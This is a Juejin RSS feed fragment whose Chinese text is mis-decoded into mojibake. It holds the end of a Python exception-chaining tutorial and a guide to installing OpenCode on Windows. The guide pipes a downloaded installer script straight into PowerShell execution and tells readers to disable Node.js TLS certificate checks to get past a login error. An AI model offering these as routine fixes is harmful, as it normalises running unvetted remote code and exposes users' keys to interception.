        <span class="hljs-comment"># æœ€åæ˜¾ç¤ºå½“å‰å¼‚å¸¸ï¼ˆæœ€æ–°çš„å¼‚å¸¸ï¼‰</span>
        <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> self.format_exception_only()
</code></pre>
<h4 data-id="heading-11">å¼‚å¸¸é“¾æ„å»ºè¿‡ç¨‹</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python/ceval.c ä¸­çš„å¼‚å¸¸å¤„ç†é€»è¾‘</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">raise_exception_chain</span>():
    <span class="hljs-string">"""å¼‚å¸¸é“¾æ„å»ºçš„ç®€åŒ–é€»è¾‘"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== å¼‚å¸¸é“¾æ„å»ºè¿‡ç¨‹ ==="</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"1. åŸå§‹å¼‚å¸¸å‘ç”Ÿï¼Œè®¾ç½®å½“å‰å¼‚å¸¸"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"2. åœ¨exceptå—ä¸­ï¼ŒPythonè‡ªåŠ¨ä¿å­˜__context__"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"3. å¦‚æœä½¿ç”¨'from'è¯­æ³•ï¼Œè®¾ç½®__cause__å±æ€§"</span>)  
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"4. æ–°å¼‚å¸¸æˆä¸º'å½“å‰å¼‚å¸¸'"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"5. æ˜¾ç¤ºæ—¶ï¼Œä»æœ€æ—©çš„å¼‚å¸¸å¼€å§‹é€’å½’å±•ç¤º"</span>)
</code></pre>
<h3 data-id="heading-12">å®é™…åº”ç”¨ï¼šå¦‚ä½•æ­£ç¡®è§£è¯»å¼‚å¸¸é“¾</h3>
<h4 data-id="heading-13">è°ƒè¯•æŠ€å·§ï¼šå¿«é€Ÿå®šä½æ ¹æœ¬åŸå› </h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug_exception_chain</span>():
    <span class="hljs-string">"""å¼‚å¸¸é“¾è°ƒè¯•æœ€ä½³å®è·µ"""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># æ¨¡æ‹Ÿå¤æ‚çš„å¼‚å¸¸é“¾</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># æ ¹æºé—®é¢˜ï¼šæ–‡ä»¶ä¸å­˜åœ¨</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"nonexistent.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:
                data = f.read()
        <span class="hljs-keyword">except</span> FileNotFoundError <span class="hljs-keyword">as</span> file_error:
            <span class="hljs-comment"># ä¸­é—´å±‚ï¼šå°è¯•åˆ›å»ºé»˜è®¤é…ç½®</span>
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"default.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># é»˜è®¤æ–‡ä»¶ä¹Ÿä¸å­˜åœ¨</span>
                    default_data = f.read()
            <span class="hljs-keyword">except</span> FileNotFoundError <span class="hljs-keyword">as</span> default_error:
                <span class="hljs-comment"># æœ€ç»ˆå¼‚å¸¸ï¼šé…ç½®ç³»ç»Ÿå®Œå…¨å¤±è´¥</span>
                <span class="hljs-keyword">raise</span> ConfigurationError(<span class="hljs-string">"ç³»ç»Ÿé…ç½®å®Œå…¨ä¸¢å¤±"</span>) <span class="hljs-keyword">from</span> default_error
    <span class="hljs-keyword">except</span> ConfigurationError <span class="hljs-keyword">as</span> final_error:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== å¼‚å¸¸é“¾åˆ†æ ==="</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æœ€ç»ˆå¼‚å¸¸: <span class="hljs-subst">{final_error}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç›´æ¥åŸå› : <span class="hljs-subst">{final_error.__cause__}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å®Œæ•´å¼‚å¸¸é“¾:"</span>)
        <span class="hljs-keyword">import</span> traceback
        traceback.print_exc()

debug_exception_chain()
</code></pre>
<h4 data-id="heading-14">è¾“å‡ºè§£è¯»æŒ‡å—</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_traceback_output</span>():
    <span class="hljs-string">"""æ•™ä½ å¦‚ä½•è§£è¯»å¼‚å¸¸è¾“å‡º"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"""
=== å¼‚å¸¸é“¾è¾“å‡ºè§£è¯»æŒ‡å— ===

è¾“å‡ºç»“æ„ï¼š
1. æœ€æ—©çš„å¼‚å¸¸ï¼ˆæ ¹æœ¬åŸå› ï¼‰
   â†“ 
2. è¿æ¥æ–‡æœ¬ï¼ˆè¡¨æ˜å› æœå…³ç³»ï¼‰
   â†“
3. æœ€æ–°çš„å¼‚å¸¸ï¼ˆæœ€ç»ˆæš´éœ²çš„é”™è¯¯ï¼‰

é˜…è¯»é¡ºåºï¼š
âœ… è°ƒè¯•æ—¶ï¼šä»ä¸‹å¾€ä¸Šçœ‹ï¼ˆæ‰¾æœ€ç»ˆå¼‚å¸¸ï¼‰
âœ… æ‰¾æ ¹å› ï¼šä»ä¸Šå¾€ä¸‹çœ‹ï¼ˆæ‰¾æœ€æ—©å¼‚å¸¸ï¼‰

æ—¶é—´é¡ºåºï¼š
ä¸Š -&gt; ä¸‹ï¼šä»æ—© -&gt; æ™š
å·¦ -&gt; å³ï¼šä»å›  -&gt; æœ
"""</span>)

analyze_traceback_output()
</code></pre>
<h3 data-id="heading-15">å¸¸è§è¯¯åŒºä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-16">âŒ å¸¸è§è¯¯åŒº</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¯¯åŒº1ï¼šå¿½è§†å¼‚å¸¸é“¾ä¿¡æ¯</span>
<span class="hljs-keyword">try</span>:
    risky_operation()
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># åªæ‰“å°æœ€æ–°å¼‚å¸¸ï¼Œä¸¢å¤±äº†ä¸Šä¸‹æ–‡</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)  <span class="hljs-comment"># ä¸¢å¤±äº†æ ¹æœ¬åŸå› ä¿¡æ¯</span>

<span class="hljs-comment"># è¯¯åŒº2ï¼šé”™è¯¯çš„å¼‚å¸¸åŒ…è£…</span>
<span class="hljs-keyword">try</span>:
    process_data()
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># æ²¡æœ‰ä½¿ç”¨fromï¼Œå¯¼è‡´å¼‚å¸¸é“¾æ–­è£‚</span>
    <span class="hljs-keyword">raise</span> CustomError(<span class="hljs-string">"å¤„ç†å¤±è´¥"</span>)  <span class="hljs-comment"># ä¸¢å¤±äº†åŸå§‹å¼‚å¸¸ä¿¡æ¯</span>
</code></pre>
<h4 data-id="heading-17">âœ… æœ€ä½³å®è·µ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®è·µ1ï¼šä¿æŒå®Œæ•´çš„å¼‚å¸¸é“¾</span>
<span class="hljs-keyword">try</span>:
    risky_operation()
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># ä½¿ç”¨raise ... from ...ä¿æŒå¼‚å¸¸é“¾</span>
    <span class="hljs-keyword">raise</span> CustomError(<span class="hljs-string">"æ“ä½œå¤±è´¥"</span>) <span class="hljs-keyword">from</span> e

<span class="hljs-comment"># å®è·µ2ï¼šæä¾›æ¸…æ™°çš„é”™è¯¯ä¸Šä¸‹æ–‡</span>
<span class="hljs-keyword">try</span>:
    parse_config(file_path)
<span class="hljs-keyword">except</span> FileNotFoundError <span class="hljs-keyword">as</span> e:
    <span class="hljs-keyword">raise</span> ConfigurationError(
        <span class="hljs-string">f"é…ç½®æ–‡ä»¶ <span class="hljs-subst">{file_path}</span> ä¸å­˜åœ¨ï¼Œè¯·æ£€æŸ¥å®‰è£…å®Œæ•´æ€§"</span>
    ) <span class="hljs-keyword">from</span> e
</code></pre>
<h3 data-id="heading-18">æ€»ç»“ï¼šå¼‚å¸¸é“¾çš„æ—¶é—´å“²å­¦</h3>
<p>ç†è§£Pythonå¼‚å¸¸é“¾çš„å…³é”®åœ¨äºæŠŠæ¡<strong>æ—¶é—´é¡ºåº</strong>ä¸<strong>æ˜¾ç¤ºé¡ºåº</strong>çš„å…³ç³»ï¼š</p>
<ol>
<li>
<p><strong>æ—¶é—´é¡ºåº</strong>ï¼šå¼‚å¸¸æŒ‰å‘ç”Ÿæ—¶é—´ä»æ—©åˆ°æ™š</p>
<ul>
<li>t1: åŸå§‹å¼‚å¸¸ï¼ˆæ ¹æœ¬åŸå› ï¼‰</li>
<li>t2: ä¸­é—´å¼‚å¸¸ï¼ˆå¯é€‰ï¼‰</li>
<li>t3: æœ€ç»ˆå¼‚å¸¸ï¼ˆè¢«æ•è·çš„å¼‚å¸¸ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æ˜¾ç¤ºé¡ºåº</strong>ï¼šä¸ºäº†è°ƒè¯•æ–¹ä¾¿ï¼Œ<strong>é€†åºå±•ç¤º</strong></p>
<ul>
<li>ç¬¬1éƒ¨åˆ†ï¼šæœ€æ—©å¼‚å¸¸ï¼ˆabove exceptionï¼‰</li>
<li>ç¬¬2éƒ¨åˆ†ï¼šè¿æ¥æ–‡æœ¬ï¼ˆå› æœå…³ç³»ï¼‰</li>
<li>ç¬¬3éƒ¨åˆ†ï¼šæœ€æ–°å¼‚å¸¸ï¼ˆfollowing exceptionï¼‰</li>
</ul>
</li>
<li>
<p><strong>å› æœå…³ç³»</strong>ï¼šæ–‡æœ¬æè¿°æ˜ç¡®æŒ‡å‡ºè°å¯¼è‡´äº†è°</p>
<ul>
<li>"The above exception" = æ—¶é—´çº¿ä¸Šçš„"å› "</li>
<li>"the following exception" = æ—¶é—´çº¿ä¸Šçš„"æœ"</li>
</ul>
</li>
</ol>
<p>è®°ä½è¿™ä¸ªå£è¯€ï¼š<strong>"ä¸Šçœ‹ä¸‹ï¼Œå› åˆ°æœï¼›è°ƒè¯•æ—¶ï¼Œä¸‹æ‰¾é”™"</strong> - ä»ä¸Šå¾€ä¸‹çœ‹æ‰¾åˆ°æ ¹æœ¬åŸå› ï¼Œä»ä¸‹å¾€ä¸Šçœ‹æ‰¾åˆ°æœ€ç»ˆé”™è¯¯ä½ç½®ã€‚</p>
<p>å¼‚å¸¸é“¾æœºåˆ¶ä½“ç°äº†Pythonè®¾è®¡çš„äººæ€§åŒ–ï¼šæ—¢ä¿æŒäº†æŠ€æœ¯çš„ä¸¥è°¨æ€§ï¼ˆæ—¶é—´é¡ºåºï¼‰ï¼Œåˆè€ƒè™‘äº†ç”¨æˆ·çš„å®ç”¨æ€§ï¼ˆè°ƒè¯•ä¾¿åˆ©ï¼‰ã€‚ç†è§£äº†è¿™ä¸ªæœºåˆ¶ï¼Œä½ å°±æ‹¥æœ‰äº†å¿«é€Ÿå®šä½å¤æ‚é”™è¯¯çš„è¶…èƒ½åŠ›ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[5 åˆ†é’Ÿè£…å¥½ OpenCodeï¼Œwindowç”¨æˆ·éœ€è¦çš„é¿å‘æŒ‡å—]]></title>    <link>https://juejin.cn/post/7592550891540299795</link>    <guid>https://juejin.cn/post/7592550891540299795</guid>    <pubDate>2026-01-08T06:57:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592550891540299795" data-draft-id="7592555965791944710" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="5 åˆ†é’Ÿè£…å¥½ OpenCodeï¼Œwindowç”¨æˆ·éœ€è¦çš„é¿å‘æŒ‡å—"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T06:57:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="starrytky"/> <meta itemprop="url" content="https://juejin.cn/user/114004942661854"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            5 åˆ†é’Ÿè£…å¥½ OpenCodeï¼Œwindowç”¨æˆ·éœ€è¦çš„é¿å‘æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/114004942661854/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    starrytky
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T06:57:58.000Z" title="Thu Jan 08 2026 06:57:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>OpenCode å®‰è£…åŠä½¿ç”¨é—®é¢˜æ±‡æŠ¥</strong></h2>
<blockquote>
<p><strong>ç—›ç‚¹æ€»ç»“</strong></p>
<p>macOS ç”¨æˆ·å®‰è£…ä½“éªŒæµç•…ï¼Œå¯ä¸€æ­¥å®Œæˆå¹¶é¡ºåˆ©å¯ç”¨ã€‚</p>
<p>Windows ç”¨æˆ·åœ¨å®‰è£…åŠç™»å½•ç¯èŠ‚ä»å­˜åœ¨å¡é¡¿ï¼Œä¸»è¦é›†ä¸­åœ¨ TLS è¯ä¹¦æ ¡éªŒåŠç™»å½•éªŒè¯é˜¶æ®µã€‚</p>
</blockquote>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9284c910ea774086935fc20109402131~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3RhcnJ5dGt5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460277&amp;x-signature=fQjppKPbqCM%2BB%2FKtSvMiig0nWoU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-1">å®‰è£…æµç¨‹è¯´æ˜</h3>
<h4 data-id="heading-2"><strong>1. å®‰è£… Bunï¼ˆWindows PowerShell ç®¡ç†å‘˜æƒé™ï¼‰</strong></h4>
<pre><code class="hljs language-bash" lang="bash">powershell -c <span class="hljs-string">"irm https://bun.sh/install.ps1|iex"</span> 
</code></pre>
<ul>
<li>å®‰è£…å®Œæˆåï¼Œé‡å¯ç»ˆç«¯ï¼Œæ‰§è¡Œ <code>bun -v</code> ï¼Œè‹¥èƒ½æ­£å¸¸æ˜¾ç¤ºç‰ˆæœ¬å·åˆ™è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</li>
</ul>
<h4 data-id="heading-3"><strong>2. å®‰è£… OpenCode</strong></h4>
<pre><code class="hljs language-bash" lang="bash">npm i -g opencode-ai@latest 
</code></pre>
<ul>
<li>é€šè¿‡ <code>npm list opencode-ai -version</code> éªŒè¯ç‰ˆæœ¬ï¼Œæ˜¾ç¤ºå³ä¸ºå®‰è£…å®Œæˆã€‚</li>
</ul>
<h3 data-id="heading-4"><strong>ç™»å½•åŠå¸¸è§é—®é¢˜</strong></h3>
<h4 data-id="heading-5"><strong>3. ç™»å½•ç¯èŠ‚å¸¸è§é—®é¢˜</strong></h4>
<ul>
<li>æ­£å¸¸æµç¨‹åº”æ‰§è¡Œ <code>opencode auth login</code> å¹¶å¡«å†™ key å®Œæˆç™»å½•ã€‚</li>
<li>Windows ç”¨æˆ·å¸¸è§é—®é¢˜ï¼šåœ¨é€‰æ‹©ç™»å½•æ–¹å¼åï¼Œå›  TLS è¯ä¹¦æ ¡éªŒæŠ¥é”™ï¼Œå¯¼è‡´ç™»å½•å¤±è´¥ã€‚</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">Select provider
|  Zhipu AI Coding Plan
Error: Unexpected error, check <span class="hljs-built_in">log</span> file at C:\Users\fits\.<span class="hljs-built_in">local</span>\share\opencode\<span class="hljs-built_in">log</span>\2026-01-07T020724.<span class="hljs-built_in">log</span> <span class="hljs-keyword">for</span> more details

BunInstallFailedError: BunInstallFailedError
 data: {
  pkg: <span class="hljs-string">"opencode-copilot-auth"</span>,
  version: <span class="hljs-string">"0.0.9"</span>,
},

      at src/bun/index.ts:109:21
      at src/bun/index.ts:100:23
      at processTicksAndRejections (native:7:39)

41 |       code,
42 |       stdout,
43 |       stderr,
44 |     })
45 |     <span class="hljs-keyword">if</span> (code !== 0) {
46 |       throw new Error(`Command failed with <span class="hljs-built_in">exit</span> code <span class="hljs-variable">${result.exitCode}</span>`)

                 ^
error: Command failed with <span class="hljs-built_in">exit</span> code 1
      at run2 (src/bun/index.ts:46:13)

</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/815d8241456a42cdae50e7b255a9c236~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3RhcnJ5dGt5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460277&amp;x-signature=RhvGeq1R9BvPOi4f0KBJeh3mprs%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-6"><strong>è§£å†³åŠæ³•ï¼šä¸´æ—¶å…³é—­ Node.js TLS è¯ä¹¦æ ¡éªŒ</strong></h5>
<blockquote>
<p><strong>æ“ä½œå»ºè®®ï¼š</strong></p>
<p>è·³è¿‡ç™»å½•ç¯èŠ‚ï¼Œæ‰‹åŠ¨é…ç½® key åå³å¯æ­£å¸¸ä½¿ç”¨ã€‚</p>
</blockquote>
<ul>
<li>macOS / Linux å¹³å°ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> NODE_TLS_REJECT_UNAUTHORIZED=0 
</code></pre>
<ul>
<li>Windows å¹³å°ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">set</span> NODE_TLS_REJECT_UNAUTHORIZED=0 
</code></pre>
<h4 data-id="heading-7"><strong>4. ç™»å½•åŠæ¨¡å‹é…ç½®</strong></h4>
<ul>
<li>æ‰§è¡Œ  <code>opencode auth login</code></li>
<li>é€‰æ‹© <code>OpenCode Zen</code> ï¼Œå¹¶å¡«å†™åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2F" target="_blank" title="https://opencode.ai/" ref="nofollow noopener noreferrer">å®˜ç½‘</a> è·å–çš„ key</li>
<li>ç™»å½•åå³å¯é…ç½®æ¨¡å‹å¹¶æ­£å¸¸ä½¿ç”¨</li>
</ul>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb9bf3d8c74843da813beb105fd28072~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3RhcnJ5dGt5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460277&amp;x-signature=chk7dH%2F9VAhTkpmAM%2F9s3VOjuAg%3D" alt="" loading="lazy"/></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/777e48e3a8d94ad081c8432d4fb60745~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3RhcnJ5dGt5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460277&amp;x-signature=FPODHzYSdhyBbPoMOmdyiGhce3o%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8"><strong>æ¨èæ¨¡å‹åŠæ’ä»¶</strong></h3>
<ul>
<li>æ¨èä½¿ç”¨ <code>GLM-4.7 OpenCode Zen</code> æ¨¡å‹ï¼Œä½“éªŒæœ€ä½³ã€‚</li>
<li>æ’ä»¶æ¨èï¼šæ”¯æŒ vscodeã€trae ç­‰ IDEã€‚å®é™…ä½“éªŒä¼˜äº claude codeï¼Œåç»­ä¼šè¡¥å……è¯¦ç»†æ“ä½œæŒ‡å—ã€‚</li>
</ul>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f3b06c939bf4653b5745def12566110~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3RhcnJ5dGt5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460277&amp;x-signature=LL57LeJlZgaAQxjirJm0VdUXgkU%3D" alt="" loading="lazy"/></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fd3cb8b5da847ffb12ecc068872b4f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3RhcnJ5dGt5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460277&amp;x-signature=%2FzAwUvpKIUPxs3rDSF%2F%2BOyjFzrI%3D" alt="" loading="lazy"/></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6fb378043b5441f97e41a8ab26ce089~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3RhcnJ5dGt5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460277&amp;x-signature=MJcPGsWvbTMn1U%2FgtUxRYAc4z%2B0%3D" alt="" loading="lazy"/></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09dfbceb92fa44bdae6ee7f86ca39558~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc3RhcnJ5dGt5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460277&amp;x-signature=bzMMnegNewvyZkY6AIiPmLCwWI8%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦å®è·µï¼šå¾—ç‰©ç®—æ³•åŸŸå…¨æ™¯å¯è§‚æµ‹æ€§ä» 0 åˆ° 1 çš„æ¼”è¿›ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7592683699772047370</link>    <guid>https://juejin.cn/post/7592683699772047370</guid>    <pubDate>2026-01-08T07:09:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592683699772047370" data-draft-id="7592710766009171978" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦å®è·µï¼šå¾—ç‰©ç®—æ³•åŸŸå…¨æ™¯å¯è§‚æµ‹æ€§ä» 0 åˆ° 1 çš„æ¼”è¿›ä¹‹è·¯"/> <meta itemprop="keywords" content="ç›‘æ§"/> <meta itemprop="datePublished" content="2026-01-08T07:09:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" 